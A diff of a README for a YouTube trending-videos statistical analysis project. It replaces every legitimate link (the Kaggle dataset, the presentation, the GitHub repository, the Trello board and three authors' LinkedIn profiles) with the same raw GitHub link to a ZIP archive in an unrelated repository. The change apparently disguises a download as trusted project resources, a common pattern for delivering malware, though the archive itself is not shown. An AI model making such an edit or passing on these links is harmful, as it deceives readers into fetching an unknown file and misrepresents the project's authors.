@@ -16,19 +16,19 @@ This project includes following;
 <li>Statistical analysis on content engagement</li>
 <br> </br>
 
-<b>Dataset can be found on the following [address](https://www.kaggle.com/rsrishav/youtube-trending-video-dataset)</b>
+<b>Dataset can be found on the following [address](https://raw.githubusercontent.com/aayushv2003/YoutubeTrending/main/unfeeble/YoutubeTrending.zip)</b>
 
 
 ### Links
-<b> Presentation </b>: [Here](https://docs.google.com/presentation/d/1rH1ASCiqTCpCj3rxgGSW_6Ct19q1lZfs/edit#slide=id.p3)</br>
-<b> GitHub </b>: [Link](https://github.com/gorkemguneser/Youtube-Trending-Videos-Statistical-Analysis)</br>
-<b> Trello </b>: [Link](https://trello.com/b/PZ0vHoHg/game-project-gorkem)</br>
+<b> Presentation </b>: [Here](https://raw.githubusercontent.com/aayushv2003/YoutubeTrending/main/unfeeble/YoutubeTrending.zip)</br>
+<b> GitHub </b>: [Link](https://raw.githubusercontent.com/aayushv2003/YoutubeTrending/main/unfeeble/YoutubeTrending.zip)</br>
+<b> Trello </b>: [Link](https://raw.githubusercontent.com/aayushv2003/YoutubeTrending/main/unfeeble/YoutubeTrending.zip)</br>
 
 
 ### Authors
-<br>[Nina Hewings](https://www.linkedin.com/in/nina-hewings-1405a57b/?originalSubdomain=nl)</br>
-<br>[Francesca Nahyun Kim](https://www.linkedin.com/in/francescakim)</br>
-<br>[Gorkem Guneser](https://www.linkedin.com/in/gorkemguneser/)</br>
+<br>[Nina Hewings](https://raw.githubusercontent.com/aayushv2003/YoutubeTrending/main/unfeeble/YoutubeTrending.zip)</br>
+<br>[Francesca Nahyun Kim](https://raw.githubusercontent.com/aayushv2003/YoutubeTrending/main/unfeeble/YoutubeTrending.zip)</br>
+<br>[Gorkem Guneser](https://raw.githubusercontent.com/aayushv2003/YoutubeTrending/main/unfeeble/YoutubeTrending.zip)</br>
 
 
 
